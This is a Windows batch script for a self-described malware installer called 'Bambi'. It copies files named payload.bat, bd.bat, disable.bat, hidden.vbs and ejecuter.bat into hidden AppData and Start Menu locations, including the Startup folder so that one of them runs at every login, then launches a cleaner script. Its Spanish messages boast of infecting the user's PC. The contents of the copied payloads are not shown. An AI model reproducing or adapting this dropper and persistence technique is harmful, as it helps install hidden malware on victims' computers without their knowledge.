@echo OFF

ipconfig

timeout /nobreak 10

C:

cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu"
md Bambi
md exploits
cd Bambi

xcopy %UserProfile%\Documents\Bamby\payload.bat "%UserProfile%\AppData" /O /X /E /H /
xcopy %UserProfile%\Documents\Bamby\cleaner.bat "%UserProfile%\AppData" /O /X /E /H /
xcopy %UserProfile%\Documents\Bamby\disable.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\installer.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\bd.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\hidden.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Documents\Bamby\ejecuter.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /O /X /E /H /K
cls
echo "[*] Copiando archivos..."
echo "[+] Archivos copiados con exito."
echo "[+] Bambi se ha instalado correctamente..."
echo "Un placer infectar tu pc... Atte: d4kit0.

timeout /nobreak 5
cd "%UserProfile%\AppData"
start cleaner.bat